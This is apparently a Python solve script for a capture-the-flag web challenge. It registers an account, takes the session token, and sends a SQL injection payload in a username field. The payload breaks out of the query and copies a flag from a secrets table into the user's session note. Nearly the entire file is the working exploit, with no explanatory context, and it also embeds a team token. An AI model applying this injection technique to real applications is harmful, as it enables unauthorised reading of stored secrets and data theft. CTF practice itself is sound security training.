import requests
from secrets import token_urlsafe

URL = "http://challs.nusgreyhats.org:34567"

rand = token_urlsafe(10)

data = {
    "public_username": rand,
    "private_username": rand + "AA", # devono essere diversi
    "password": "pisellololo",
    "display_name": "pisello",
    "bio": "pisello"
}

headers = {
    "X-Team-Token": "tt_XAZ4jitSx1_A9i-tL6xCQoSo8Sma_KG7svI9o3Yvsl8"
}

r = requests.post(f"{URL}/api/register", json=data, headers=headers)
print(r.text)
data = r.json()

s_token = data["data"]["profile"]["session_token"]
print(s_token)

# update user
headers["X-session-token"] = s_token

data = {
    "username": f"{rand}', session_note=(SELECT flag FROM secrets WHERE owner_player_id=current_setting('app.player_id', true)::int) -- A"
}

r = requests.post(f"{URL}/api/profile/private-rename", json=data, headers=headers)
print(r.text)
